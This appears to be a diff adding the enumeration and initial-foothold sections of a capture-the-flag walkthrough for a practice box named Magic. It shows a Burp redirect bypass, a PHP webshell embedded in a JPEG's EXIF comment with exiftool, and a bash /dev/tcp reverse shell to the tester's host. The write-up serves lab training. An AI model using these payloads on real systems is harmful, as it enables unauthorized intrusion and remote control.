@@ -48,3 +48,124 @@ We have two ports open.
 Before we move on to enumeration, let's make some mental notes about the scan results.
 * The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it's unlikely that we gain initial access through this port, unless we find credentials.
 * Port 80 is running a web server. AutoRecon by default runs gobuster and nikto scans on HTTP ports, so we'll have to review them. Since this is the only other port that is open, it is very likely to be our initial foothold vector.
+
+### Enumeration
+
+Visit the application in the browser.
+
+![](/linux-boxes/magic/images/02.png)
+
+Viewing the page source doesn't give us any useful information. Next, view Autorecon's gobuster scan.
+
+```
+root@kali:~/# cat tcp_80_http_gobuster.txt | grep -v 403
+/assets (Status: 301) [Size: 313]
+/images (Status: 301) [Size: 313]
+/index.php (Status: 200) [Size: 5069]
+/index.php (Status: 200) [Size: 5067]
+/login.php (Status: 200) [Size: 4221]
+/logout.php (Status: 302) [Size: 0]
+/upload.php (Status: 302) [Size: 2957]
+```
+
+Right off the bat, I see something that could potentially be very concerning. The upload.php & logout.php pages are internal pages (require authentication) that lead to a 302 redirect when a user attempts to access them. However, the interesting part is the response size. The upload.php response size is much larger than what a normal 302 redirect response would be. So if I had to guess, the PHP script is not properly terminated after user redirection, which could give us unrestricted access to any internal page in the application. 
+
+We can confirm this using Burp proxy. Visit the upload.php script and intercept the traffic in Burp. As can be seen in the below image, before the request is redirected to the login page, we are served with the upload page.
+
+![](/linux-boxes/magic/images/03.png)
+
+Now all we have to do is change the HTTP Status Code from "302 Found" to "200 OK" and we get access to the upload page. To have Burp automatically do that for you, visit the Proxy > Options tab. In the Match and Replace section, set the following options.
+
+![](/linux-boxes/magic/images/04.png)
+
+Now visiting the upload.php page in the browser does not redirect to the login.php page.
+
+![](/linux-boxes/magic/images/05.png)
+
+An improperly implemented upload functionality could potentially give us code execution on the box. However, that would require two conditions:
+1. Being able to upload a shell on the box
+2. Being able to call and execute that shell
+
+Even if I could upload PHP code, it's not much use if I can't call it. So let's upload a JEPG image and see if we can call it through the web server.
+
+![](/linux-boxes/magic/images/06.png)
+
+We get a file has been uploaded message. Visiting the root directory, we see that our image is included in the slide show.
+
+![](/linux-boxes/magic/images/07.png)
+
+Viewing the page source gives us the path to the image.
+
+![](/linux-boxes/magic/images/08.png)
+
+Good. So we do have a way to call the image. Now all we need to do is figure out a way to bypass file upload restrictions to upload PHP code.
+
+### Initial Foothold
+
+Try and upload a file with a ".php" extension.
+
+![](/linux-boxes/magic/images/09.png)
+
+We get the above message indicating that there are backend restrictions on the file extension. Next, try and upload a file with the extension ".php.jpeg".
+
+![](/linux-boxes/magic/images/10.png)
+
+We get a different error message. So we bypassed the extension restriction, but we're now faced with another restriction. My guess is it is checking the mime type of the file. To bypass that, we'll use exiftool to add PHP code to our cat image.
+
+```
+exiftool -Comment='<?php system($_GET['cmd']); ?>' cat.jpeg
+```
+
+This adds a parameter to the GET request called cmd that we'll use to get code execution. View the type of the file.
+
+```
+root@kali:~# file cat.php.jpeg 
+cat.php.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system(['cmd']); ?>", baseline, precision 8, 121x133, components 3
+```
+
+The file is still a JPEG image, so it should bypass MIME type restrictions. Upload the file.
+
+![](/linux-boxes/magic/images/11.png)
+
+Perfect! Now call the file with the cmd parameter to confirm that we have code execution.
+
+![](/linux-boxes/magic/images/12.png)
+
+We have code execution! Now, let's get a reverse shell. First, set up a listener on the attack machine.
+
+```
+nc -nlvp 443
+```
+
+Then run the request again and send it to Repeater. Next, visit [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and add the bash reverse shell in the 'cmd' parameter.
+
+```
+bash -c 'bash -i >& /dev/tcp/10.10.14.171/443 0>&1'
+```
+
+Make sure to URL encode it before you send the request (Ctrl + U).
+
+![](/linux-boxes/magic/images/13.png)
+
+We get a shell! Let's upgrade it to a better shell.
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.
+
+```
+stty raw -echo
+```
+
+Once that is done, run the command "fg" to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.
+
+```
+export TERM=xterm
+```
+
+Unfortunately, we're running as the web daemon user www-data and we don't have privileges to view the user.txt flag. Therefore, we need to escalate our privileges.
+
+
+
